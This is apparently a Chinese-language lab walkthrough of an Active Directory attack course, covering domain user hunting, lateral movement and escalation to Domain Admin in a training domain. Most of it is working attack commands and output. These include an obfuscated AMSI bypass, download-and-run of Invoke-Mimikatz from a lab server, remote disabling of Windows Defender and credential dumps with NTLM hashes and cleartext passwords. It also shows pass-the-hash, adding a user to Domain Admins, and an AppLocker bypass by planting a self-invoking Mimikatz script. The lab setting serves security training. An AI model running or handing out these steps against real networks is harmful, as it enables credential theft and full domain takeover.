neo4j.bat install-service
```
再执行：
```
neo4j.bat start
```

3. 开启BloodHound
工具： BloodHound-win32-x64

双击BloodHound.exe

第一次登录的账号密码，neo4j:neo4j （会要求更改密码）

去到:http://localhost:7474 修改密码

用修改完成的密码登录bloodhound


展开bloodhound，可以发现所有student用户对```dcorp-adminsrv.dollarcorp.moneycorp.local```这台计算机拥有admin accesss权限


问题：Collectionmethod in BloodHound that covers all the collection methods
答案：All

# Learning Objective - 7

Task
> ● Domain user on one of the machines has access to a server where a domain admin is logged in.
> Identify:
> − The domain user
> − The server where the domain admin is logged in.
> ● Escalate privileges to Domain Admin
> − Using the method above.
> −  Using derivative local admin 



现在已经进到Jenkins所在的靶机，当前账号是ciadmin，是这台靶机内的adminstrators组成员

输入命令再次绕过AMSI和poswershell执行策略

## userhunter
下面命令可以把远程脚本导入到本机内存，无须下载执行脚本到本地。



运行invoke-userhunter，查找
```
PS C:\users\ciadmin> iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
PS C:\users\ciadmin> invoke-userhunter

UserDomain      : dollarcorp.moneycorp.local
UserName        : Administrator
ComputerName    : dcorp-appsrv.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.217
SessionFrom     : 172.16.2.1
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

可以看到svcadmin登录过dcorp-mgmt，计算机名字是```dcorp-mgmt.dollarcorp.moneycorp.local```

查看当前账号（ciadmin）对哪些机器有本地管理员权限
```
PS C:\users\ciadmin> invoke-userhunter -checkAccess
UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      : True
```

看到是有LocalAdmin权限的，可以用以下命令在对方机器执行验证
```
PS C:\users\ciadmin> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
dcorp\ciadmin
dcorp-mgmt
```
## 横向移动

引入Invoke-Mimikatz.ps1，并且在内存中执行

```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

从上面我们已经知道当前账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess```

指定目标靶机的session，在目标靶机执行Mimikatz
```Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess```


执行操作如下，导出所有ntml 哈希
```
PS C:\Program Files (x86)\Jenkins\workspace\project1> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>
PS C:\Program Files (x86)\Jenkins\workspace\project1> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL(('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syt'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"({n`ULl},${t`RuE} )
PS C:\Program Files (x86)\Jenkins\workspace\project1> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
PS C:\Program Files (x86)\Jenkins\workspace\project1> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 62734 (00000000:0000f50e)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
        msv :
         [00000003] Primary
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : df 1c e9 70 98 2f e1 9f 34 9d f2 d9 a4 75 e2 f0 88 4a 0c 4a 48 fc 82 64 0b cc d6 3d 8d c5 b0 1c 56 57 44 23 e1 d7 b3 0e 66 6d 7f 8c 23 00 39 4
 3d ee 67 ee 6f 28 b5 70 47 76 65 1b 66 a3 6f 71 85 73 7a 94 33 4e 38 a1 6f 2a 16 2c 23 7d 2f ba a2 86 fe 63 62 3e 2d 8e 9a af d6 1d 7e 05 a5 1c eb 04 d2 40 bf 6d c
 cb b7 fd db f6 23 ed bf 9b d3 30 80 03 d6 a9 87 14 88 47 09 8e 26 c3 b4 e7 f6 f6 5f 4b 62 e1 9c 3e 51 4b 7d 4c c0 a1 02 48 72 df b0 3c 32 55 09 ae e2 b7 aa e9 ca e
 f3 d7 fd 65 b4 92 f3 c1 ff ec 81 95 15 b3 db ce 7d 05 41 81 59 2c f6 fd 46 d4 43 cb 89 61 88 2e 5a 1a 99 5f 03 d9 ad 74 f6 c8 35 3e 33 7c 22 20 8a 70 b5 e6 35 1e 4
 60 6f f9 c8 a0 7e b6 9a 84 2a 42 91 df bd fb 54 f6 d8 a9 ba 29 5a 90 70 de ba 53
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21649 (00000000:00005491)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 207093 (00000000:000328f5)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:44:31 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1121
        msv :
         [00000003] Primary
         * Username : mgmtadmin
         * Domain   : dcorp
         * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
         * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
         * DPAPI    : b826a190021809d711368730cfc6e41d
        tspkg :
        wdigest :
         * Username : mgmtadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 64905 (00000000:0000fd89)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:27 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1122
        msv :
         [00000003] Primary
         * Username : svcadmin
         * Domain   : dcorp
         * NTLM     : b38ff50264b74508085d82c69794a4d8
         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
         * DPAPI    : fd3c6842994af6bd69814effeedc55d3
        tspkg :
        wdigest :
         * Username : svcadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:24 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :
```

整理出所有导出的用户哈希
```
SQLTELEMETRY：639c1adde3e0d1ba0d733c7d0d8f23ec
DCORP-MGMT$：639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin：95e2cd7ff77379e34c6e46265e75d754
svcadmin：b38ff50264b74508085d82c69794a4d8
```

因为svcadmin是Domain Admins组成员，我们已经成功取得这个域的特权账号。



## 提权到Domain Admins方法（一）Over the hash

使用下面命令可以利用高权限哈希生成一个令牌shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```


回到我们的学生靶机，现在我们有了svcadmin的哈希信息，可以回到学生靶机用Mimikatz运行一个有Domain Admins权限的shell。需要注意，新打开的shell，还是在学生机里面，我们并没有进入域控，但其实是有Domain Admins权限的
```
PS C:\Windows\system32> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd c:/ad
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74
508085d82c69794a4d8 /run:powershell.exe"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c6979
4a4d8 /run:powershell.exe
user    : svcadmin
domain  : dollarcorp.moneycorp.local
program : powershell.exe
impers. : no
NTLM    : b38ff50264b74508085d82c69794a4d8
  |  PID  3104
  |  TID  4864
  |  LSA Process is now R/W
  |  LUID 0 ; 41299079 (00000000:02762c87)
  \_ msv1_0   - data copy @ 0000028946288B00 : OK !
  \_ kerberos - data copy @ 0000028946AF9928
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000028946B47AF8 (32) -> null

PS C:\ad>
```


新开的shell
```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
dcorp\student366
```


在新开的shell里把当前账号添加进Domain Admins组中
```
PS C:\Windows\system32> net group "Domain Admins" student366 /ADD /DOMAIN
The request will be processed at a domain controller for domain dollarcorp.moneycorp.local.

The command completed successfully.
```

上面命令执行完成以后，另外一个shell查找所有域管理员,本账号（student366）已被成功添加进Domain Admins
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad>  Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Hulk
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-68601
IsGroup      : False
MemberDN     : CN=Hulk,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : student369
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-45147
IsGroup      : False
MemberDN     : CN=student369,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : student366
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-45144
IsGroup      : False
MemberDN     : CN=student366,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

## 提权到Domain Admins方法（二）

在学生机器用powerview查看当前账号拥有admin权限进入的计算机
```
PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
```

可以看见，除了本机还有一台dcorp-adminsrv

还可以用Find-PSRemotingLocalAdminAccess查看，结果一致
```
PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```

下面两个命令都可以横向移动到dcorp-adminsrv
```Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local```
或者
```Enter-PSSession  dcorp-adminsrv.dollarcorp.moneycorp.local```

可以看到当前账号dcorp\student366属于本地管理员（BUILTIN\Administrators）
```
PS C:\ad> Enter-PSSession  dcorp-adminsrv.dollarcorp.moneycorp.local
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```


可以绕过powershell执行策略，但是没有办法绕过AMSI,产生了报错
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\student366\Documents>
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`B
L(('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syt'+'em') ) )."g`etf`iElD
"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"({n`ULl},${t`RuE} )
Get-varIABL : The term 'Get-varIABL' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included,
verify that the path is correct and try again.
At line:1 char:98
+ ... 'uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL(('1Q'+' ...
+                                                     ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-varIABL:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

不能在当前靶机引入任何powershell脚本，（既不能下载到本地，也不能在内存中引入）因为在dcorp-adminsrv这台机器有 Applocker策略

> 什么是Applocker策略？
> AppLocker 可推进软件限制策略的应用控制特性和功能。 AppLocker 包含新的功能和扩展，允许你创建规则以允许或拒绝应用基于文件的唯一标识运行，并指定哪些用户或组可以运行这些应用
> 使用 AppLocker，你可以：
> 控制以下类型的应用：可执行文件（.exe 和 .com) 、 scripts (.js、.ps1、.vbs、.cmd 和 .bat) 、Windows Installer 文件 (.mst、.msi 和 .msp) 以及 DLL 文件（.dll 和 .ocx) ），以及打包的应用和封装应用安装程序 (appx) 。
> 根据从数字签名派生的文件属性（包括发布者、产品名称、文件名和文件版本）定义规则。 例如，可以创建基于通过更新持久化发布者属性的规则，也可以为文件的特定版本创建规则。
> 向安全组或单个用户分配规则。
> 创建规则异常。 例如，您可以创建一个规则，允许除注册表编辑器 (Regedit.exe Windows之外的所有进程运行) 。
> 使用仅审核模式部署策略，并在强制执行它之前了解其影响。
> 导入和导出规则。 导入和导出会影响整个策略。 例如，如果导出策略，将导出所有规则集合的所有规则，包括规则集合的强制设置。 如果导入策略，将覆盖现有策略的所有条件。
> 通过使用 cmdlet 简化 AppLocker 规则的创建Windows PowerShell管理。

下面命令枚举所有Applocker策略

```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> $ExecutionContext.SessionState.LanguageModeConstrainedLanguage
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections


PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```


从上面枚举的策略可以看到，只有```{%PROGRAMFILES%\*}```和```{%WINDIR%\*}```可以执行脚本

但是因为Constrained Language Mode，CLM，就算能把脚本拷贝到靶机，我们也不能执行，因为dcorp-adminsrv有CLM

什么是CLM?
>约束语言模式（Constrained Language Mode，CLM）是限制PowerShell的一种方法，可以限制PowerShell访问类似 Add-Type 之类的功能或者许多反射（reflective）方法（攻击者可以通过这些方法，在后续渗透工具中利用PowerShell运行时作为攻击媒介

那怎么办呢？

###  关闭Windows Defender
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
```

### script调用自己

方法：
1. 复制一份Invoke-Mimikatz.ps1，取名为：Invoke-Mimikatz2.ps1
2. 在Invoke-Mimikatz2.ps1文件的最底部，加一行命令：Invoke-Mimikatz  #其实就是调用自己


把修改好的脚本拷贝到dcorp-adminsrv，注意根据上面的Applocker策略，只可以放在Program Files文件夹
```
Copy-Item .\Invoke-Mimikatz2.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

回到dcorp-adminsrv，已经可以看到拷贝过来的脚本
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                Common Files
d-----        7/16/2016   6:18 AM                internet explorer
d-----        8/20/2020   3:48 AM                Windows Defender
d-----        7/16/2016   6:18 AM                WindowsPowerShell
-a----        2/13/2022   6:39 AM        2530075 Invoke-Mimikatz2.ps1
```

执行Invoke-Mimikatz2，导出所有哈希
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-Mimikatz2.ps1

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 166214 (00000000:00028946)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:43:30 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1115
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : dcorp
         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 67126 (00000000:00010636)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1117
        msv :
         [00000003] Primary
         * Username : appadmin
         * Domain   : dcorp
         * NTLM     : d549831a955fee51a43c83efb3928fa7
         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
        tspkg :
        wdigest :
         * Username : appadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21719 (00000000:000054d7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 66422 (00000000:00010376)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1113
        msv :
         [00000003] Primary
         * Username : websvc
         * Domain   : dcorp
         * NTLM     : cc098f204c5887eaa8253e7c2749156f
         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
        tspkg :
        wdigest :
         * Username : websvc
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```

现在在dcorp-adminsrv机器上我们有了srvadmin的哈希，可以回到学习机器上使用Over pass the hash开启一个有域管理员权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local  /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```


Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local


iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)


Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'


# Learning Objective - 8
> Task
> ● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
> ● Using the NTLM hash of krbtgt account, create a Golden ticket.
> ● Use the Golden ticket to (once again) get domain admin privileges from a machine.


现在我们已经是Domain Admins管理组成员。在新开的DA权限的shell里运行Find-PSRemotingLocalAdminAccess
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-dc
dcorp-mgmt
dcorp-std359
dcorp-std363
